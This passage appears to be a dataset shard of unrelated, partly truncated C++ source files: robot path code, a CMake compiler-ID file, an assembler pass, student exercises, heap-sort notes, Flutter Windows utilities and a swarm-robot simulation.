//path.add_straight(Straight({  33_in,  31_in, 0_deg }, 0_in, MOTOR_SPEED::MID,false,500_ms));\n\n    // Go back for the second ball on the left\n    path.add_turn(MyTurn(-30_deg, 600_ms));\n    path.add_straight(Straight({50_in, -8_in, 0_deg}, 0_in, MOTOR_SPEED::MID, true));\n    path.add_intake_control(IN);\n    path.add_straight(Straight({50_in, -8_in, 0_deg}, 0_in, MOTOR_SPEED::MID, true));\n    path.add_intake_control(IN_WITH_SENSE);\n\n\n    /*\n    path.add_turn(MyTurn(70_deg));\n    path.add_intake_control(OUT_SLOW);\n    path.add_delay(400);\n    path.add_intake_control(REST);\n    path.add_straight(Straight({  75_in,  5_in, 0_deg}, 0_in, MOTOR_SPEED::SLOW,true,200_ms));\n    path.add_intake_control(IN);\n    path.add_straight(Straight({  75_in,  5_in, 0_deg}, 0_in, MOTOR_SPEED::SLOW,false,600_ms));\n    path.add_intake_control(IN_WITH_SENSE);\n    path.add_straight(Straight({54_in, -5_in, 0_deg}, 0_in, MOTOR_SPEED::MID, false, 9999_s));\n    */\n\n    // line up for push over\n    //path.add_straight(Straight({54_in, -4_in, 0_deg}, 0_in, MOTOR_SPEED::MID, true, 500_ms));\n    path.add_turn(MyTurn(45_deg));\n\n    path.add_wing_control(Wing(OPEN, FRONT));\n    path.add_straight(Straight({  58_in, 6_in, 0_deg}, 0_in, MOTOR_SPEED::MID,true,400_ms));\n    path.add_intake_control(OUT);\n    path.add_straight(Straight({  58_in, 6_in, 0_deg}, 0_in, MOTOR_SPEED::FAST,true,1000_ms));\n\n\n    path.add_straight(Straight({50_in, 0_in, 0_deg}, 0_in, MOTOR_SPEED::MID, true, 2000_ms));\n\n    // path.add_turn(-10_deg);\n    // path.add_straight(Straight({  54_in,  4_in, 0_deg}, 0_in, MOTOR_SPEED::MID,true,200_ms));\n    // path.add_intake_control(IN);\n    // path.add_straight(Straight({  54_in,   4_in, 0_deg}, 0_in, MOTOR_SPEED::MID,false,1000_ms));\n    // path.add_intake_control(IN_WITH_SENSE);\n\n    path.add_straight(Straight({58_in, 6_in, 0_deg}, 0_in, MOTOR_SPEED::MID, true, 2000_ms));\n    //path.add_straight(Straight({  60_in,   8_in, 0_deg}, 0_in, MOTOR_SPEED::MID,true,1000_ms));\n\n    path.add_intake_control(OUT_SLOW);\n    path.add_delay(600);\n    path.add_intake_control(REST);\n\n    /*\n    path.add_straight(Straight({54_in, -5_in, 0_deg}, 0_in, MOTOR_SPEED::MID, false, 1500_ms));\n    path.add_straight(Straight({  68_in,  13_in, 0_deg}, 0_in, MOTOR_SPEED::MID,true,100_ms));\n    path.add_straight(Straight({  70_in,   18_in, 0_deg}, 0_in, MOTOR_SPEED::MID,false,1000_ms));\n    */\n\n    path.add_intake_control(REST);\n    path.add_wing_control(Wing(CLOSE, FRONT));\n\n\n\n\n\n    // go back to the starting point\n    path.add_straight(Straight({24_in, 4_in, 0_deg}, 0_in, MOTOR_SPEED::MID, false, 9999_s));\n    path.add_delay(1250);\n    path.add_straight(Straight({3_in, 1_in, 0_deg}, 0_in, MOTOR_SPEED::MID, true, 1_s));\n    path.add_turn(MyTurn(-90_deg, 800_ms));\n\n\n\n\n\n// intake balls\npath.add_wing_control(Wing(OPEN, BACK_LEFT));\nfor (int i = 0; i < 7; i++) {\npath.add_straight(Straight({1.5_in, 0_in, 0_deg}, 1_in, MOTOR_SPEED::MID_STRAIGHT, false, 800_ms));\npath.add_straight(Straight({3.0_in, 13_in, 0_deg}, 1_in, MOTOR_SPEED::MID_STRAIGHT, false, 800_ms));\n}\npath.add_wing_control(Wing(CLOSE, BACK_LEFT));\npath.add_wing_control(Wing(OPEN, BACK_RIGHT));\n\npath.add_delay(200);\n\n// go to the other ",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "// This is the pass 1 of the 2 pass assembler\n// RUN THIS BEFORE pass2.cpp\n\n// including necessary header files\n#include <bits/stdc++.h>\n#include <vector>\nusing namespace std;\n\n// necessary macros\ntypedef long long li;\n#define vi vector<li>\n#define vvi vector<vi>\n#define pii pair<li, li>\n#define mmp map<li, li> mp\n#define rep(i, a, b) for (li i = a; i < b; i++)\nconst li N = 1e5 + 2, MOD = 1e9 + 7;\n\n// this function is used remove whitespaces from a string\nstring whiteSpaceRemover(string str)\n{\n    string ans = \"\"; // empty string\n\n    for (auto i : str) // iterating through the loop\n        if (i != ' ')\n            ans = ans + i;\n\n    // returning the string without spaces\n    return ans;\n}\n\n// this function is used to read the operation table from the \"inputFiles/operationTable.txt\" file and store it in a map\nvoid operationTableReader(map<string, string> &operationTable)\n{\n    // reading file using ifstream class\n    ifstream opTab(\"inputFiles/operationTable.txt\");\n\n    // check if the file is not opened\n    if (!opTab.is_open())\n    {\n        cout << \"Error in opening the operation table file\" << endl;\n        exit(0);\n    }\n\n    string line = \"\"; // string for iterating through the contents of the operationTable.txt file\n\n    while (getline(opTab, line)) // reading the file sentence by sentence\n    {\n        // Extracting the mnemonic and code, remove whitespaces, and store in the map\n        string mnemonic = whiteSpaceRemover(line.substr(0, 7));\n        string code = whiteSpaceRemover(line.substr(7, 2));\n        operationTable[mnemonic] = code;\n    }\n    // closing the file pointer\n    opTab.close();\n}\n\n// this is a function to format a number with a specified width and option for hexadecimal\nstring format_number(string input, int width, bool hex)\n{\n    int num;\n    // Convert the input string to an integer, either decimal or hexadecimal\n    if (hex)\n        num = stoi(input, NULL, 16);\n    else\n        num = stoi(input);\n\n    // Formatting the name and converting it back to a string\n    stringstream temp;\n    temp << std::hex << std::uppercase << std::setfill('0') << std::setw(width) << num;\n    return temp.str();\n}\n\n// this is a function to format a name with a specified width\nstring format_name(string name, int width)\n{\n    // Format the name and convert it back to a string\n    stringstream temp;\n    temp << std::left << std::setfill(' ') << std::setw(width) << name;\n    return temp.str();\n}\nint main()\n{\n    // Initialize the operation table\n    map<string, string> operationTable;\n    operationTableReader(operationTable);\n\n    // Initialize the symbol table\n    map<string, int> symbolTable;\n\n    // reading the input File\n    ifstream inputFile(\"inputFiles/input.txt\");\n\n    // PLEASE MAKE SURE THE EMPTY DIRECTORY \"pass1_outputFiles\" IS CREATED.\n    // declaring pointers for the output of pass1 files\n    ofstream intermediateFile(\"pass1_outputFiles/intermediate.txt\");\n    ofstream symbolTableFile(\"pass1_outputFiles/symbolTable.txt\");\n    ofstream lengthFile(\"pass1_outputFiles/lengthFile.txt\");\n\n    // integers for storing length and addresses\n    int locationCounter = 0, startingAddress = 0, LENGTH;\n\n    // for checking error conditions\n    bool error = false;\n\n    // for reading the input file\n    string line = \"\";\n\n    while (getline(inputFile, line)) // reading the input file sentence by sentence\n    {                               \n        string label = \"\", opcode = \"\", operand = \"\"; // Extract label, opcode, and operand from the input line, remove whitespaces\n        label = whiteSpaceRemover(line.substr(0, 10));\n        if (label != \".\")\n        {\n            opcode = whiteSpaceRemover(line.substr(10, 10));\n            operand = whiteSpaceRemover(line.substr(20, 10));\n        }\n\n        // Check for comments and process the rest of the line if not a comment\n        if (label != \".\")\n        {\n            // Process START, END, and other instructions\n            if (opcode == \"START\")\n            {\n                startingAddress = stoi(operand, NULL, 16);\n                locationCounter = startingAddress;\n                // Write the formatted line to the intermediate file\n                intermediateFile << format_name(format_number(to_string(locationCounter), 4, false), 10) << line << '\\n';\n            }\n            else if (opcode == \"END\")\n            {\n                LENGTH = locationCounter - startingAddress;\n                intermediateFile << format_name(\"\", 10) << line;\n                break;\n            }\n            else\n            {\n                // Process labels, increment locationCounter based on the opcode\n                if (label != \"\")\n                {\n                    if (symbolTable.find(label) == symbolTable.end())\n                        symbolTable[label] = locationCounter;\n                    else\n                    {\n                        error = true; // duplicate symbol\n                        cout << \"duplicate symbol\\n\";\n                    }\n          ",
    "#include <iostream>\n#include <math.h>\n\nusing namespace std;\n\nint zad1(int a,int b, int c){\n    if((pow(a,2)+pow(b,2))==pow(c,2)) return 1;\n    else return 0;\n}\nvoid zad2(){\n    cout << \"Tr\u00f3jki liczb pitagorejskich z zakresu od 1 do 10:\\n\";\n    for (int a = 1; a <= 10; ++a) {\n        for (int b = 1; b <= 10; ++b) {\n            for (int c = 1; c <= 10; ++c) {\n                if (zad1(a, b, c)) {\n                    cout << a << \", \" << b << \", \" << c << \"\\n\";\n                }\n            }\n        }\n    }\n}\nvoid zad3(int tab[], int length) {\n    for (int i = 0; i < length - 1; ++i) {\n        for (int j = 0; j < length - i - 1; ++j) {\n            if (tab[j] > tab[j + 1]) {\n                int temp = tab[j];\n                tab[j] = tab[j + 1];\n                tab[j + 1] = temp;\n            }\n        }\n    }\n}\n\n\n\nvoid zad4(int tab[], int length) {\n    for (int i = 0; i < length - 1; ++i) {\n        for (int j = 0; j < length - i - 1; ++j) {\n            if (tab[j] < tab[j + 1]) {\n                int temp = tab[j];\n                tab[j] = tab[j + 1];\n                tab[j + 1] = temp;\n            }\n        }\n    }\n}\nint zad5(int n){\n    if(n==0) return 1;\n    else return n*zad5(n-1);\n}\nint zad6(int n){\n    int result=1;\n    for(int i=1;i<=n;i++){\n        result*=i;\n    }\n    return result;\n}\nint zad7(int n){\n    int result = 0;\n    int odd = 1;\n\n    while (n >= odd) {\n        n -= odd;\n        odd += 2;\n        result++;\n    }\n\n    return result;\n}\nint zad8(int number){\n    int sqrtNumber = sqrt(number);\n\n    if (number % 100 == sqrtNumber)return 1;\n    else return 0;\n}\nint zad9(int number){\n    double sqrtNumber = sqrt(number);\n\n    if (sqrtNumber == floor(sqrtNumber)) return 1;\n    else return 0;\n\n}\nbool zad10(int number){\n    if (number <= 1) {\n        return false;\n    }\n\n    for (int i = 2; i * i <= number; ++i) {\n        if (number % i == 0) {\n            return false;\n    }\n\n    return true;\n}\n}\n\nint main()\n{\n    //zad1\n\n    int a,b,c;\n    int tab[]= {3,6,1,8,4,1,9,5};\n    int tab2[]= {5,8,1,5,0,4,6,8};\n    cout<<\"podaj liczbe: \";\n    cin>>a;\n    cout<<\"podaj liczbe: \";\n    cin>>b;\n    cout<<\"podaj liczbe: \";\n    cin>>c;\n    cout << \"zad1\" << endl;\n    if(zad1(a,b,c)) cout<<\"Te liczby sa pitagorejskie\"<<endl;\n    else cout<<\"Te liczby nie sa pitagorejskie\"<<endl;\n\n    //zad2\n    cout << \"zad2\" << endl;\n    zad2();\n    //zad3\n    cout << \"zad3\" << endl;\n    int n = sizeof(tab) / sizeof(tab[0]);\n    for(int i=0;i<n;i++){\n        cout<<tab[i]<<\" \";\n    }\n\n    zad3(tab,n);\n    cout<<endl;\n    for(int i=0;i<n;i++){\n        cout<<tab[i]<<\" \";\n    }\n    cout<<endl;\n    //zad4\n    cout << \"zad4\" << endl;\n    n = sizeof(tab2) / sizeof(tab2[0]);\n    for(int i=0;i<n;i++){\n        cout<<tab2[i]<<\" \";\n    }\n    zad4(tab2,n);\n    cout<<endl;\n    for(int i=0;i<n;i++){\n        cout<<tab2[i]<<\" \";\n    }\n    cout<<endl;\n    //zad5\n    cout << \"zad5\" << endl;\n    cout<<\"Podaj n:\";\n    cin>>a;\n    cout<<a<<\"! = \"<<zad5(a)<<endl;\n    //zad6\n    cout << \"zad6\" << endl;\n    cout<<a<<\"! = \"<<zad6(a)<<endl;\n    //zad7\n    cout << \"zad7\" << endl;\n    cout<<\"Liczba calkowita pierwiastka z liczby: \"<<c<<\" to: \"<<zad7(c)<<endl;\n    //zad8\n    cout << \"zad8\" << endl;\n    cout<<\"Podaj liczbe: \";\n    cin>>a;\n    if(zad8(a))cout << \"Liczba \" << a << \" konczy sie swoim pierwiastkiem.\" << endl;\n    else cout << \"Liczba \" << a << \" konczy nie sie swoim pierwiastkiem.\" << endl;\n    //zad9\n    cout << \"zad9\" << endl;\n\n    if(zad9(a))cout << \"Liczba \" << a << \" jest kwadratem liczby calkowitej.\" <<endl;\n    else cout << \"Liczba \" << a << \" nie jest kwadratem liczby calkowitej.\" <<endl;\n    //zad10\n    cout << \"zad10\" << endl;\n    if(zad10(a)) cout << \"Liczba \" << a << \" jest liczba pierwsza.\" << endl;\n    else cout << \"Liczba \" << a << \" nie jest liczba pierwsza.\" << endl;\n    return 0;\n}\n",
    "\n#include<iostream>\n#include<vector>\nusing namespace std;\n\n//Here I will include some theory on heaps. note that I had already covered the heap assignments, so here i will Just write about\n//the new things i have learnt.\n\n\n//Building a heap from an array using a straightforward approach like pushing each element in an array and perculating up can \n//take a complexity of O(nlogn).\n\n//We can do better tho!\n\n// The above approach can be optimized by observing the fact that the leaf nodes need not to be heapified as they already follow\n// the heap property.\n\n// Also, the array representation of the complete binary tree contains the level order traversal of the tree. \n// So the idea is to find the position of the last non-leaf node and perform the heapify operation of each non-leaf node in reverse level order.\n\n\n// Array = {1, 3, 5, 4, 6, 13, 10, 9, 8, 15, 17}\n// Corresponding Complete Binary Tree is:\n\n//                  1\n//               /     \\                      //\n//            3         5\n//         /    \\     /  \\                   //\n//       4      6   13  10\n//      / \\    / \\                           //\n//    9   8  15 17\n\n// The task to build a Max-Heap from above array.\n\n// Total Nodes = 11.\n//To build the heap, heapify only the nodes: [1, 3, 5, 4, 6] in reverse order.\n// Last Non-leaf node index = (11/2) \u2013 1 = 4.\n// Therefore, last non-leaf node = 6.\n\n//So for building a maxheap, perculate down starting from 6 all the way to 1.\n//This theoritically was proved to take O(n) time !\n\nvoid perculate_down(vector<int> & v, int curr, int end){\n\n\n    int k = curr;\n    while(k < end){ \n        int index; \n        if(2*k + 2 < end){\n            index = (v[2*k+2] > v[2*k+1]) ? 2*k+2 : 2*k+ 1;\n        }\n        else if(2*k+1 < end){\n            if(v[k] < v[2*k+1]){index = 2*k+1;}\n            else{return;}\n        }\n        else {\n            return;\n        }\n\n        swap(v[k], v[index]);\n        k = index;\n\n    }\n\n}\n\nvoid swap(int& a, int& b){\n    int temp = a;\n    a = b;\n    b = temp;\n}\n\nvoid heapify(vector<int>& v){\n\n    //Note that this creates a min heap.\n    //Also note that 0 based indexing is used, i.e l.child = 2*curr + 1, r.child = 2*curr+2\n\n    int end = v.size()/2 - 1;\n    for(int i = end; i >= 0; i--){\n        perculate_down(v, i, v.size());\n    }\n}\n\nvoid heapsort(vector<int>& v){\n    heapify(v);\n    //inplace heapsort.\n    // swap the top node(arr[0]) with \"last\" which moves towards the start from the end.\n    int last = v.size() - 1;\n    while(last){\n        swap(v[0], v[last]);\n        //the current last will be the size of the array.\n        perculate_down(v, 0, last);\n        last--;\n    }\n}\nint main(){\n    vector<int> v = {-1 , -2, 11, 99};\n    heapsort(v);\n    for(int x : v){\n        cout << x << \" \";\n    }\n\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"Def-Physics.h\"\r\n#include \"struct.h\"\r\n#include \"mt19937ar.h\"//For random\r\n#define _USE_MATH_DEFINES\r\n#include <math.h>\r\n#include \"Prototype.h\"\r\n\r\nAgent _resting2searching(Agent my_info)\r\n{\r\n\tAgent upd_info = my_info;\r\n\tif (my_info.time_resting > MAXTIME_REST)\r\n\t{\r\n\t\tupd_info.state = SEARCHING;\r\n\t\tupd_info._posori.ori = 2 * M_PI * genrand_real1();\t\t//orientation is randomly determined\r\n\t\tupd_info.time_searching = 0;//searching time is resetted\r\n\t\tupd_info.dist_straight = 0;//free path is resetted\r\n\t}\r\n\treturn upd_info;\r\n}\r\n\r\nAgent _resting2following(vector<Agent> _agent, int num_agent, Agent my_info)\r\n{\r\n\tAgent upd_info = my_info;\r\n\tfor (int j = 0; j < num_agent; j++)\r\n\t{\r\n\t\tif (_agent[j].state == RECRUITING) //calculate distance to recruiters \r\n\t\t{\r\n\t\t\tdouble dist_robot2recruiter = hypot(_agent[j]._posori.pos.x - my_info._posori.pos.x, _agent[j]._posori.pos.y - my_info._posori.pos.y);\r\n\t\t\tdouble ang_robot2recruiter = atan2(_agent[j]._posori.pos.y - my_info._posori.pos.y, _agent[j]._posori.pos.x - my_info._posori.pos.x);\r\n\r\n\t\t\tif (dist_robot2recruiter < (RADIUS_SENSOR + RADIUS_AGENT))//within the range of sensor\r\n\t\t\t{\r\n\t\t\t\tupd_info.state = FOLLOWING;\r\n\t\t\t\tupd_info.leaderID = j;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\treturn upd_info;\r\n}\r\n\r\nAgent _searching2following(vector<Agent> _agent, int num_agent, Agent my_info)\r\n{\r\n\tAgent upd_info = my_info;\r\n\tfor (int j = 0; j < num_agent; j++)\r\n\t{\r\n\t\tif (_agent[j].state == RECRUITING_S) //calculate distance to recruiters \r\n\t\t{\r\n\t\t\tdouble dist_robot2recruiter = hypot(_agent[j]._posori.pos.x - my_info._posori.pos.x, _agent[j]._posori.pos.y - my_info._posori.pos.y);\r\n\t\t\tdouble ang_robot2recruiter = atan2(_agent[j]._posori.pos.y - my_info._posori.pos.y, _agent[j]._posori.pos.x - my_info._posori.pos.x);\r\n\r\n\t\t\tif (dist_robot2recruiter < (RADIUS_SENSOR + RADIUS_AGENT))//within the range of sensor\r\n\t\t\t{\r\n\t\t\t\tupd_info.state = FOLLOWING;\r\n\t\t\t\tupd_info.leaderID = j;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\treturn upd_info;\r\n}\r\n\r\nAgent _searching2pushing_pushingF(vector<Prey> _food, int num_food, Agent my_info, vector<Agent> _agent, int num_agent)\r\n{\r\n\tAgent upd_info = my_info;\r\n\tfor (int j = 0; j < num_food; j++)\r\n\t{\r\n\t\tdouble dist_robot2prey = hypot(_food[j].pos.x - my_info._posori.pos.x, _food[j].pos.y - my_info._posori.pos.y);\r\n\r\n\t\tif (dist_robot2prey < (RADIUS_AGENT + RADIUS_FOOD + RADIUS_GRABBING)&&//contact to food\r\n\t\t\t_food[j].transport == false)\r\n\t\t{\t\t\t\r\n\t\t\tfor (int k = 0; k < num_agent; k++)\r\n\t\t\t{\r\n\t\t\t\tdouble dist_robot2robot = hypot(_agent[k]._posori.pos.x - my_info._posori.pos.x, _agent[k]._posori.pos.y - my_info._posori.pos.y);\r\n\t\t\t\tif ((_agent[k].state == PUSHING || _agent[k].state == PUSHING_F) &&\r\n\t\t\t\t\tdist_robot2robot < RADIUS_AGENT + RADIUS_SENSOR)//Any pushing agent is in sensing area\r\n\t\t\t\t{\r\n\t\t\t\t\tupd_info.state = PUSHING;\r\n\t\t\t\t\tupd_info.food_info.detect = true;//set for the case which does not perform judge_food\r\n\t\t\t\t\tupd_info.food_info.id = j;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tif (upd_info.state != PUSHING)//No other agent exists\r\n\t\t\t{\r\n\t\t\t\tupd_info.state = PUSHING_F;\r\n\t\t\t\tupd_info.mem_foodpos.x = _food[j].pos.x;\r\n\t\t\t\tupd_info.mem_foodpos.y = _food[j].pos.y;\r\n\t\t\t\tupd_info.mem_foodID = j;\r\n\t\t\t\tupd_info.time_pushinglead = 0;\r\n\t\t\t\tupd_info.food_info.detect = true;//set for the case which does not perform judge_food\r\n\t\t\t\tupd_info.food_info.id = j;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tfor (int k = 0; k < num_agent; k++)//contact to other pushing robot\r\n\t\t{\r\n\t\t\tdouble dist_robot2robot = hypot(_agent[k]._posori.pos.x - my_info._posori.pos.x, _agent[k]._posori.pos.y - my_info._posori.pos.y);\r\n\t\t\tif ((_agent[k].state == PUSHING) &&\r\n\t\t\t\tdist_robot2robot > RADIUS_GRABBING && //exclude myself(dist=0)\r\n\t\t\t\tdist_robot2robot < (2 * RADIUS_AGENT + RADIUS_GRABBING))//contact to pushing robot\r\n\t\t\t{\r\n\t\t\t\tif (dist_robot2prey < (RADIUS_FOOD + RADIUS_SENSOR) &&//food is within the range of sensing area\r\n\t\t\t\t\t_food[j].transport == false)\r\n\t\t\t\t{\r\n\t\t\t\t\tupd_info.state = PUSHING;\r\n\t\t\t\t\tupd_info.food_info.detect = true;//set for the case which does not perform judge_food\r\n\t\t\t\t\tupd_info.food_info.id = j;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\treturn upd_info;\r\n}\r\n\r\nAgent _following2pushing(vector<Prey> _food, int num_food, Agent my_info, vector<Agent> _agent, int num_agent)\r\n{\r\n\tAgent upd_info = my_info;\r\n\r\n\tfor (int j = 0; j < num_food; j++)\r\n\t{\r\n\t\tdouble dist_robot2prey = hypot(_food[j].pos.x - my_info._posori.pos.x, _food[j].pos.y - my_info._posori.pos.y);\r\n\r\n\t\tif (dist_robot2prey < (RADIUS_AGENT + RADIUS_FOOD + RADIUS_GRABBING) &&\r\n\t\t\t_food[j].transport == false)//contact to food\r\n\t\t{\r\n\t\t\tupd_info.state = PUSHING;\r\n\t\t\tupd_info.food_info.detect = true;//set for the case which does not perform judge_food\r\n\t\t\tupd_info.food_info.id = j;\r\n\t\t}\r\n\r\n\t\tfor (int k = 0; k < num_agent; k++)\r\n\t\t{\r\n\t\t\tdouble dist_robot2robot = hypot(_agent[k]._posori.pos.x - my_info._posori.pos.x, _agent[k]._posori.pos.y - my_info._posori.pos.y);\r\n\t\t\tif (_agent[k].state == PUSHING &&\r\n\t\t\t\tdist_robot2robot < (2 * RADIUS_AGENT + RADIUS_GRABBING))//contact to pushing robot\r\n\t\t\t{\r\n\t",
